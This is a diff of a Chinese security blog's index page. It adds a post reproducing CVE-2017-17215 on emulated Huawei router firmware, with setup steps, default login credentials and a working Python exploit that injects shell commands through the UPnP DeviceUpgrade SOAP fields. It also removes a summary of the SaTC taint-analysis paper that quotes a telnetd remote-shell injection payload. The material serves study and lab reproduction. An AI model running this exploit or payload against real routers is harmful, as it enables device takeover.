@@ -60,10 +60,10 @@
 			</ul>
 		</nav>
                                 <nav>
-                                               总文章数 35
+                                               总文章数 36
                                 </nav>
                                 <nav>
-	总字数 <span class="post-count">56.2k</span>
+	总字数 <span class="post-count">56.6k</span>
                                 </nav>
 		<nav class="header-smart-menu">
     		
@@ -157,6 +157,113 @@
           </div>
           <div id="js-content" class="content-ll">
             
+  
+    <article id="post-CVE-2017-17215复现" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        <div align="center" class="post-count">
+    字数：375字 | 预计阅读时长：1分钟
+</div>
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/">CVE-2017-17215复现</a>
+    </h1>
+  
+
+        
+        <a href="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/" class="archive-article-date">
+  	<time datetime="2024-02-12T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-02-13</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><img src="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240208155017023.png"></p>
+<p>web端登录账号密码：admin，@Hua1234</p>
+<p>安装qemu</p>
+<p><img src="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240213220456220.png"></p>
+<p>安装依赖文件：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libglib2<span class="number">.0</span> libglib2<span class="number">.0</span>-dev autoconf automake libtool uml-utilities bridge-utils</span><br></pre></td></tr></table></figure>
+
+<p>下载模拟系统镜像和大端机：</p>
+<p><a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/mips/">https://people.debian.org/~aurel32/qemu/mips/</a></p>
+<p><img src="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240213220543495.png"></p>
+<p>创建网桥，添加IP：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brctl addbr Virbr0</span><br><span class="line">ifconfig Virbr0 <span class="number">192.168</span><span class="number">.147</span><span class="number">.100</span>/<span class="number">24</span> up</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240212160548814.png"></p>
+<p><img src="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240212161815900.png"></p>
+<p>ping测试一下</p>
+<p><img src="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240212162040772.png"></p>
+<p>创建tap接口，添加到Virbr0内：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tunctl -t tap0</span><br><span class="line">ifconfig tap0 <span class="number">192.168</span><span class="number">.147</span><span class="number">.101</span>/<span class="number">24</span> up</span><br><span class="line">brctl addif Virbr0 tap0</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240213220844160.png"></p>
+<p>在系统内再开启一个bedain系统：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-mips -M malta -kernel vmlinux<span class="number">-2.6</span><span class="number">.32</span><span class="number">-5</span><span class="number">-4</span>kc-malta -hda debian_squeeze_mips_standard.qcow2 -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> -netdev tap,id=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic</span><br></pre></td></tr></table></figure>
+
+<p>将提取出来的嵌入式系统squashfs-root传到虚拟机内：</p>
+<p><img src="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240212163848840.png"></p>
+<p>在根目录下启动shell：</p>
+<p><img src="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240212164001679.png"></p>
+<p>再开一个终端使用ssh连接该虚拟机，用来开启upnp和mic：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh root@<span class="number">192.168</span><span class="number">.147</span><span class="number">.102</span></span><br><span class="line">chroot squashfs-root /bin/sh</span><br><span class="line">./bin/upnp</span><br><span class="line">./bin/mic</span><br></pre></td></tr></table></figure>
+
+<p>测试37215端口是否开启</p>
+<p><img src="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240212164627024.png"></p>
+<p>运行exp脚本</p>
+<p><img src="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240212174629800.png"></p>
+<p>前后对比发现成功新建了文件</p>
+<p><img src="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240212165016599.png"></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="string"> &lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span></span><br><span class="line"><span class="string">   &lt;NewStatusURL&gt;;mkdir hack1;&lt;/NewStatusURL&gt;</span></span><br><span class="line"><span class="string">   &lt;NewDownloadURL&gt;;mkdir hello1;&lt;/NewDownloadURL&gt;</span></span><br><span class="line"><span class="string">  &lt;/u:Upgrade&gt;</span></span><br><span class="line"><span class="string"> &lt;/s:Body&gt;</span></span><br><span class="line"><span class="string">&lt;/s:Envelope&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">response = requests.post(<span class="string">&#x27;http://192.168.147.102:37215/ctrlt/DeviceUpgrade_1&#x27;</span>,headers=headers,data=data)</span><br><span class="line"><span class="built_in">print</span>(response)</span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
   
     <article id="post-CVE-2017-17215" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
@@ -1250,197 +1357,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2024/01/27/1-27/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-1-26" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        <div align="center" class="post-count">
-    字数：4k字 | 预计阅读时长：14分钟
-</div>
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/01/26/1-26/">1.26</a>
-    </h1>
-  
-
-        
-        <a href="/2024/01/26/1-26/" class="archive-article-date">
-  	<time datetime="2024-01-25T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-01-26</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Sharing-More-and-Checking-Less-Leveraging-Common-Input-Keywords-to-Detect-Bugs-in-Embedded-Systems"><a href="#Sharing-More-and-Checking-Less-Leveraging-Common-Input-Keywords-to-Detect-Bugs-in-Embedded-Systems" class="headerlink" title="Sharing More and Checking Less: Leveraging Common Input Keywords to Detect Bugs in Embedded Systems"></a>Sharing More and Checking Less: Leveraging Common Input Keywords to Detect Bugs in Embedded Systems</h1><h2 id="1、摘要"><a href="#1、摘要" class="headerlink" title="1、摘要"></a>1、摘要</h2><p>  在嵌入式系统中，许多流行的漏洞都存在于其易受攻击的Web服务中。然而，现有的漏洞检测方法无法有效地分析这样的Web服务：它们要么引入重载执行开销，要么具有许多误报和漏报。为了解决这个问题，本文提出了一种新颖的静态污点检查解决方案SaTC，以有效地检测嵌入式设备提供的Web服务中的安全漏洞。</p>
-<p>  关键见解是，在Web界面上的字符串文字通常在前端文件和后端二进制文件之间共享以编码用户输入。因此，文章从前端提取这些共同的关键字，并使用它们在后端中定位参考点，以指示输入入口。然后，应用有针对性的数据流分析来准确检测不受信任的用户输入的危险用途。</p>
-<h3 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h3><p>现有的方法不能有效地分析嵌入式系统中的服务来检测漏洞。它们被前端和后端之间的复杂交互和隐式数据依赖所阻止。</p>
-<p>现有解决方法：</p>
-<h3 id="动态方法："><a href="#动态方法：" class="headerlink" title="动态方法："></a>动态方法：</h3><p>如模糊化和仿真，为运行后端提供了具体的上下文。但是，动态执行可能只到达程序状态的一小部分，产生大量漏报。</p>
-<h3 id="静态方法："><a href="#静态方法：" class="headerlink" title="静态方法："></a>静态方法：</h3><p>静态方法，如KARONTE，依赖于前端和后端之间的常见进程间通信（IPC）范例（例如，环境变量），来定位输入处理代码并执行集中测试。但是，这些方法可能会产生许多误报，因为它们忽略了存储在前端文件中的用户输入上下文。</p>
-<h2 id="2、想法和问题"><a href="#2、想法和问题" class="headerlink" title="2、想法和问题"></a>2、想法和问题</h2><p>本文中，我们提出了SaTC（共享关键字感知污点检查），一种新的静态分析方法，跟踪前端和后端之间的用户输入的数据流，以精确地检测安全漏洞。</p>
-<h3 id="激励性的实例"><a href="#激励性的实例" class="headerlink" title="激励性的实例"></a>激励性的实例</h3><p><strong>实例</strong></p>
-<p><img src="/2024/01/26/1-26/image-20240126145802962.png"></p>
-<p>  有一个名为通用USB闪存盘的USB驱动器安装在路由器上，用户决定将其删除。从前端Web界面，她只需单击卸载按钮。前端将自动合成一个卸载请求，并附上设备名称（左侧status_usb.js中的第4行，然后将请求发送到右侧的后端。后端Web服务器将解析请求并调用函数formsetUsbUnload来处理请求。函数formsetUsbUnload标识设备名称，合成命令字符串（httpd中的第4行）并执行命令以卸载指定的设备（httpd中的第5行）。</p>
-<p>  由于函数formsetUsbUnload生成unmount命令而不进行任何清理检查，因此攻击者可以将额外的命令附加到deviceName，从而在路由器上运行任意命令。例如，恶意deviceName 22;telnetd -l &#x2F;bin&#x2F;sh -p 3333 &amp;强制后端程序运行两个命令：1）netcenter.22和2）telnetd -l &#x2F;bin&#x2F;sh -p 3333 &amp;，其中第二个命令启动服务器以接受任何未来的命令。</p>
-<p>  之前的方法不能有效识别，比如动态方法需要触发前后端所有正常交互，比如卸载，很容易被忽略。静态方法则是专注于后端二进制文件，考虑所有路径，可能存在许多非用户输入的，产生误报。</p>
-<p><strong>后端函数：</strong></p>
-<p><img src="/2024/01/26/1-26/image-20240126150836090.png"></p>
-<p>可以看到后端处理函数与前端共享了setUsbUnload和deviceName，以此可以快速定位污点源并根据污点分析追踪使用情况。</p>
-<p><strong>基于以下三个原则从后端和前端提取字符串：</strong></p>
-<ol>
-<li>选择前端字符串，这些字符串用于对用户输入进行编码，并在发送给后端的网络包中使用。具体来说，该字符串是网络包中形式为…&amp;key&#x3D;value&amp;…的“键”。他们手动触发尽可能多的前端操作，以覆盖更多的请求消息。</li>
-<li>选择后端字符串，这些字符串用于从消息中检索输入数据。根据他们对IoT固件的了解，他们定义了几个常用于获取输入值的函数，如示例中的websGetVar。他们收集这些函数的常量字符串参数作为有趣的后端字符串。</li>
-<li>对收集到的前端和后端字符串进行交集操作。对于交集中的每个字符串，他们在前端中变异相关数据以触发发送请求消息到后端，并检查后端中相关变量的值。如果后端变量相应地改变其值，他们确认被测试的字符串是表示用户输入的共享关键词。为了避免意外更改后端变量，他们进行多次变异操作。</li>
-</ol>
-<p>平均而言，在前端捕获的关键字-值对中有92.4%与后端中的匹配</p>
-<p>F-Strs表示从前端选择的字符串，用于对用户输入进行编码; B-allStrs表示后端中所有可打印的字符串; Intersection表示后端中用于检索数据的F-Strs字符串;</p>
-<p><img src="/2024/01/26/1-26/image-20240126153003300.png"></p>
-<p><strong>面临的问题</strong>：</p>
-<p><strong>C1</strong>:在前端识别关键字。用户输入通常会在前端隐藏有一个关键字，比如在激励样本中的deviceName。然而，解压的固件包含成千上万个字符串在前端。没有领域知识或实际执行，要理解每个字符串的语义是具有挑战性的。</p>
-<p><strong>C2</strong>:在后端定位输入处理程序。后端二进制文件包含许多函数，其中只有一小部分处理用户输入。同时，它们还包含大量的字符串和相应的引用点，理想情况下，这个点应该与用户输入紧密相关，并且其位置应该接近输入的真实使用。</p>
-<p><strong>C3</strong>:跟踪用户输入的大量路径以检测漏洞。为了检测漏洞，我们需要跟踪从输入入口到所有可能的漏洞点的数据流，这可能包含大量路径。现有的分析工具引入了很高的开销，并且不能处理复杂的控制流图或绕过用户输入的净化。我们需要一种高效的数据流分析和路径探索方法。</p>
-<p>由此文章提出SaTC来应对上述三个挑战：</p>
-<p><img src="/2024/01/26/1-26/image-20240126155148287.png"></p>
-<p>SaTC在固件前端搜索以查找输入关键字，并在后端定位其引用。从参考点开始，SaTC使用输入敏感的污点分析来发现后端的漏洞。</p>
-<h2 id="3、具体实现"><a href="#3、具体实现" class="headerlink" title="3、具体实现"></a>3、具体实现</h2><h3 id="1、输入关键词提取"><a href="#1、输入关键词提取" class="headerlink" title="1、输入关键词提取"></a>1、输入关键词提取</h3><p>前端关键词有两种：参数关键词如deviceName和操作关键词如setUsbUnload</p>
-<ul>
-<li>对于HTML文件，由于其具有标准格式，因此使用正则表达式提取关键字，例如id、name和action属性的值。其中action属性的值被视为操作关键字。</li>
-<li>对于基于XML的服务，例如简单对象访问协议（SOAP）和通用插件和播放协议（UPnP），通常在其XML文件中具有固定的格式来标记输入数据。因此，我们只需要进行预分析，然后使用正则表达式提取关键字。XML主体中第一级标签的名称被视为操作关键字。</li>
-<li>对于JavaScript文件，由于其格式经常发生变化，因此正则表达式无法正确识别关键字。因此，将JavaScript文件解析为抽象语法树（AST），并扫描每个Literal节点以从value属性中提取值。如果Literal节点包含符号&#x2F;，则将字符串视为操作关键字。进一步搜索所有CallExpression节点，找到使用典型应用程序编程接口（API）作为其被调用方的节点，例如sendSOAPAction。匹配节点的API方法或参数也被视为操作关键字。</li>
-</ul>
-<p>处理完后还需要进一步过滤，比如去掉带有！和@的字符，因为它们在生成http请求时通常会被转义。</p>
-<p><strong>边界二进制文件识别</strong>：即与前端交互的文件，从每个后端二进制文件中提取字符串，并尝试将其与输入的候选关键字进行匹配。我们将与最多关键字匹配的二进制文件视为边界二进制文件。</p>
-<p>###2、输入入口识别</p>
-<p>在接收来自前端的请求后，Web服务器会调用相应的处理函数来解析输入数据，定义后端二进制文件中相应的解析输入数据的处理函数为<strong>“输入引入点（input entry）”</strong>。该模块主要用于识别边界二进制文件中的输入引入点。</p>
-<p><strong>1）关键词引用定位器</strong></p>
-<p><img src="/2024/01/26/1-26/image-20240126170515206.png"></p>
-<p>当关键词或包含关键词串的字符串作为参数（参数或动作）时，函数被视为入口，并在所有关键字引用中，优先考虑动作处理程序中的操作关键字。</p>
-<p><strong>2）隐式引入点查找器</strong></p>
-<p>下列的action和usbName在前端中没有对应，所以检测不到9、10行的问题，但是由于4、8行与周围的输入项十分接近，因此它们也被视为隐式输入项。</p>
-<p><img src="/2024/01/26/1-26/image-20240126170342196.png"></p>
-<p><img src="/2024/01/26/1-26/image-20240126170640683.png"></p>
-<p><strong>3）跨进程引入点查找器</strong></p>
-<p>一些输入数据流可能在不同进程之间传递和共享。进程间数据流的共享通常是通过某种共享数据存储（如NVRAM）间接传递，而不同进程间用户数据保存位置和用户数据再检索位置往往会共享相同的关键字。</p>
-<p>因此，作者构建跨进程引入点查找器来跟踪固件中跨越二进制文件或组件的用户输入。它搜索各种使用共享字符串来标记数据的进程间通信范式（包括环境变量与NVRAM），并建立从设定点到使用点的数据流。</p>
-<h3 id="3、输入敏感污点分析"><a href="#3、输入敏感污点分析" class="headerlink" title="3、输入敏感污点分析"></a>3、输入敏感污点分析</h3><p>SaTC利用路径探索和污点分析技术来跟踪输入数据，以检测在后端的危险使用。为了解决准确率、效率等问题，作者根据固件的独有特征，设计了三种优化方法：粗粒度污点引擎、高效路径探索和路径优先策略。</p>
-<p><strong>1）粗粒度污点引擎</strong></p>
-<p>根据前面输入引入点识别的结果，SaTC将对应目标函数的返回值或者参数标记为污点源；同时，SaTC的污点引擎在指令层传播污点属性，为了更恰当地处理函数调用，首先将函数分为以下三类：</p>
-<ul>
-<li>可总结的函数（summarizable function,）：与内存区域操作相关的标准库函数</li>
-<li>一般函数（general function）：不包含函数调用指令，或者只包含通往可总结函数的分支</li>
-<li>嵌套函数（nested function）：包含对一般函数的函数调用</li>
-</ul>
-<p>针对所提出的函数类型，作者设计了一种算法对不同类型的函数和嵌套函数的情况进行处理，有效跟踪程序中的污点传播，算法如下图所示。</p>
-<p><img src="/2024/01/26/1-26/image-20240126200341120.png"></p>
-<ol>
-<li>首先是函数的定义，函数名为TAINT_SPECIFICATION，接受两个参数：Ins（指令）和Taint_Map（污点映射）。</li>
-<li>如果输入指令Ins是函数调用(IS_FUNCALL)：<ul>
-<li>获取函数地址func(GETFUNCADDR)。</li>
-<li>获取返回值(retv)和参数(params)(GETPARAMS)。</li>
-<li>检查参数中是否存在污点信息(HAS_TAINT)，如果不存在则直接返回。</li>
-<li>如果函数有可总结函数(HAS_SUMMARY)，则应用污点规则(TAINT_RULE)。</li>
-<li>否则，如果函数是嵌套函数(IS_NESTFUNC)：<ul>
-<li>如果返回值是指针类型并且已使用(IS_POINTER &amp;&amp; IS_USED)，则标记返回值为污点(T)。</li>
-<li>否则，标记参数为污点(T)。</li>
-</ul>
-</li>
-<li>否则，进入函数的内部(STEPINTO)并应用污点规则。</li>
-</ul>
-</li>
-<li>如果输入指令Ins不是函数调用，则直接应用污点规则(TAINT_RULE)。</li>
-</ol>
-<p><img src="/2024/01/26/1-26/image-20240126202310172.png"></p>
-<p>A主体不包含函数调用，则直接进入A处理。</p>
-<p>get处包含可总结函数，处理。</p>
-<p>B调用了C，C是嵌套函数，因此对C参数和返回值进行判断处理。</p>
-<p><strong>2）高效路径探索</strong></p>
-<p>SaTC重点检测内存溢出和命令注入。</p>
-<p><strong>a. 敏感路径引导：</strong></p>
-<ol>
-<li>SaTC在探索任何路径之前，都会搜索每个目标的污点汇聚函数调用路径（sink call traces）。污点汇聚函数调用路径表示从引入点到潜在的污点汇聚函数之间的调用图中的函数调用序列。</li>
-<li>SaTC根据每个函数的调用树来搜索函数的污点汇聚函数调用路径，如果该函数不包含污点汇聚函数调用路径，则表示该函数不可达污点汇聚点，SaTC将从目标集合中删除该函数内的所有引入点。</li>
-<li>在探索过程中，SaTC检查每个函数调用指令，以查看目标是否属于调用链。如果是，我们就会将探索重定向到该函数体内部。</li>
-</ol>
-<p><strong>b. 调用路径合并：</strong></p>
-<p>在从一个输入条目开始的过程中，可能存在大量的调用链，其中许多调用链共享一些公共路径。为了减少分析工作量，SaTC尽可能地合并具有相同输入条目的调用链。</p>
-<p><img src="/2024/01/26/1-26/image-20240126204722270.png"></p>
-<p><strong>3）路径优化策略</strong></p>
-<p>一些特殊的函数往往会对路径探索产生一定的负面影响，主要包括sanitizers function与parsers function两种，SaTC对此类函数进行识别并应用相应规则处理。</p>
-<ul>
-<li>parsers function：包含一个循环的函数。遍历所有解析路径确保不遗漏所有可能的污点传播路径</li>
-<li>sanitizers function：进行无害处理的函数，如下图所示，往往包含复杂的循环与比较操作。对这种函数而言，SaTC仅考虑最长的路径，因为最长的路径受到的约束越多月完整。以函数的起始块为根节点向下遍历直到找到叶子节点，记录相应的路径长度，反复迭代后仅留存最长的路径。</li>
-</ul>
-<h2 id="4、实验"><a href="#4、实验" class="headerlink" title="4、实验"></a>4、实验</h2><ul>
-<li>输入关键字提取模块基于标准的XML处理库和JavaScript解析库Js2Py实现。</li>
-<li>输入入口识别模块基于Ghidra库和扩展的KARONTE的CPF（覆盖具有NVRAM的共享污染变量）实现。</li>
-<li>输入敏感性分析的污点引擎是基于angr构建的，它是一个多架构的二进制分析框架。</li>
-<li>路径选择部分基于Ghidra库实现。为了使SaTC在MIPS架构上更加可用，修复了angr的二进制加载器和KARONTE的寄存器误用问题。</li>
-<li>SaTC和KARONTE在设计层面上有相似处和差异，它们都依赖于公共字符串来连接物联网设备的不同组件。SaTC通过识别前端和后端之间的公共标识符来定位用户输入的条目，从而可以通过分析前端文件揭示后端的输入项，提高了污点分析的能力，进而增强了bug检测能力。相比之下，KARONTE使用多个后端二进制文件之间的公共字符串来连接数据流，但这些公共字符串并不能保证与用户输入相关，导致了分析效率低下和错过bug的情况。</li>
-</ul>
-<p>satc 是否能够有效的检测漏洞,效率与其他类似软件相比怎么样?</p>
-<p><img src="/2024/01/26/1-26/image-20240127160151731.png"></p>
-<p>对比情况</p>
-<p><img src="/2024/01/26/1-26/image-20240127160221277.png"></p>
-<h2 id="5、总结展望"><a href="#5、总结展望" class="headerlink" title="5、总结展望"></a>5、总结展望</h2><ul>
-<li>可扩展性</li>
-</ul>
-<p>​    只要系统符合通过关键字在前后端传递信息,就可以使用satc的思想进行BUG探索</p>
-<ul>
-<li>隐式关键字处理</li>
-</ul>
-<p>​    尝试寻找隐藏模式,更好的处理前后端之间的关系</p>
-<ul>
-<li>效率 &amp; 准确率</li>
-</ul>
-<p>​    satc得到的了很好的平衡</p>
-<ul>
-<li>加密和模糊</li>
-</ul>
-<p>​    satc未来的工作,对于加密或模糊后的数据,不能很好的识别,关注现有的反混淆技术</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2024/01/26/1-26/">展开全文 >></a>
         </p>
       
 
